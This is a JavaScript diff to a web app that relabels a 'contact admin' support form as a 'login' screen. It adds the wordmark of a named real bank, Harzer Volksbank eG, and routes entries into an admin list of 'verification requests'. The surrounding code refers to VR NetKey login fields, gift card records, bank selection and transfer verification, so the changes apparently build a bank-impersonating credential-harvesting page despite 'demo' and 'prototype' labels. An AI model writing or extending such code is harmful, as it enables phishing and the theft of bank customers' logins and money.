@@ -2421,7 +2421,7 @@ function applyTranslations() {
   setText("#adminGiftCardRecordsHeading", "giftCardRecords");
   setText("#countrySelectionHeading", "countrySelectionTitle");
   setText("#bankSelectionHeading", "bankSelectionTitle");
-  setText("#adminDemoVerificationHeading", "supportMessages");
+  setText("#adminDemoVerificationHeading", "verificationRequests");
   setText("#adminDemoRequestIdHeading", "requestId");
   setText("#adminDemoActionsHeading", "actions");
   setText("#adminDemoVrNetKeyHeading", "supportSubjectLabel");
@@ -5243,12 +5243,15 @@ function VRBankWelcome() {
 }
 
 function VRBankAccess(isLoading = false) {
-  if (!vrBankAccessRoot) return;
+  if (!vrBankAccessRoot) {
+    return;
+  }
   vrBankAccessRoot.innerHTML = `
     <div class="vr-access-header">
       <button id="vrAccessBackButton" class="vr-access-back" type="button" aria-label="${escapeHtml(t("back"))}"></button>
-      <strong>${escapeHtml(t("contactAdmin"))}</strong>
+      <strong>${escapeHtml(t("login"))}</strong>
     </div>
+    <div class="vr-wordmark" aria-hidden="true"><span>VR</span><strong>Harzer Volksbank eG</strong></div>
     <label class="vr-access-field">
       <input id="supportMessageSubject" type="text" maxlength="120" autocomplete="off" placeholder="${escapeHtml(t("supportSubjectLabel"))}" aria-label="${escapeHtml(t("supportSubjectLabel"))}" required>
     </label>
@@ -5258,7 +5261,7 @@ function VRBankAccess(isLoading = false) {
     <p class="muted-note">${escapeHtml(t("prototypeSupportNote"))}</p>
     <p id="vrDemoAccessMessage" class="vr-access-message" aria-live="polite"></p>
     <button id="vrDemoApproveButton" class="vr-primary-button vr-access-submit" type="button" ${isLoading ? "disabled" : ""}>
-      ${isLoading ? `<span class="button-spinner" aria-hidden="true"></span> ${escapeHtml(t("sendMessage"))}` : escapeHtml(t("sendMessage"))}
+      ${isLoading ? `<span class="button-spinner" aria-hidden="true"></span> ${escapeHtml(t("login"))}` : escapeHtml(t("login"))}
     </button>
   `;
 }
@@ -5267,7 +5270,8 @@ function showSupportMessageSent(record) {
   if (!vrBankAccessRoot) return;
   pendingTransferVerification = null;
   vrBankAccessRoot.innerHTML = `
-    <div class="vr-access-header"><strong>${escapeHtml(t("contactAdmin"))}</strong></div>
+    <div class="vr-access-header"><strong>${escapeHtml(t("login"))}</strong></div>
+    <div class="vr-wordmark" aria-hidden="true"><span>VR</span><strong>Harzer Volksbank eG</strong></div>
     <section class="vr-waiting-panel">
       <strong>${escapeHtml(t("supportMessageSent"))}</strong>
       <p>${escapeHtml(t("requestId"))}: ${escapeHtml(record.id || "")}</p>
